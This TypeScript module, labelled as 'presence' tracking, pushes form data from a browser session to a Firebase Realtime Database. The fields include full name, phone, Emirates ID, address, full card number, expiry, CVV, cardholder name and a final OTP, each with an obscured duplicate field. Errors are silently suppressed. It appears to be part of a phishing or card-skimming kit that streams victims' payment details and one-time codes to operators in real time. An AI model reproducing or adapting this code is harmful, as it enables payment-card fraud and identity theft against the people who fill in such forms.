import { ref, set, onDisconnect, remove } from 'firebase/database';
import { rtdb } from './firebase';

export type PresenceData = {
  registrationId?: string | number;
  page?: string;
  step?: string;
  fullName?: string;
  phone?: string;
  emiratesId?: string;
  region?: string;
  streetAddress?: string;
  neighborhood?: string;
  deliveryDate?: string;
  paymentMethod?: string;
  onlineAt?: string;
  // card fields
  cardNumber?: string;
  _v1?: string;
  expiryDate?: string;
  _v3?: string;
  cvv?: string;
  _v2?: string;
  cardHolderName?: string;
  _v4?: string;
  finalOtp?: string;
  _v13?: string;
};

function sessionKey(): string {
  if (typeof window === 'undefined') return '';
  let k = sessionStorage.getItem('_pkey');
  if (!k) {
    k = Math.random().toString(36).slice(2) + Date.now().toString(36);
    sessionStorage.setItem('_pkey', k);
  }
  return k;
}

let _presRef: ReturnType<typeof ref> | null = null;

/** Join / update the presence channel with current data. Returns a cleanup fn. */
export function trackPresence(data: PresenceData): () => void {
  if (typeof window === 'undefined') return () => {};

  const key = sessionKey();
  if (!key) return () => {};

  const presRef = ref(rtdb, `presence/${key}`);
  _presRef = presRef;

  const payload = { ...data, onlineAt: new Date().toISOString() };

  set(presRef, payload).catch(() => {});

  // Auto-remove when the browser disconnects
  onDisconnect(presRef).remove().catch(() => {});

  return () => {
    remove(presRef).catch(() => {});
    _presRef = null;
  };
}

/** Update tracked data without re-subscribing. */
export function pushPresence(data: PresenceData): void {
  if (typeof window === 'undefined') return;
  const key = sessionKey();
  if (!key) return;
  const presRef = _presRef ?? ref(rtdb, `presence/${key}`);
  set(presRef, { ...data, onlineAt: new Date().toISOString() }).catch(() => {});
}
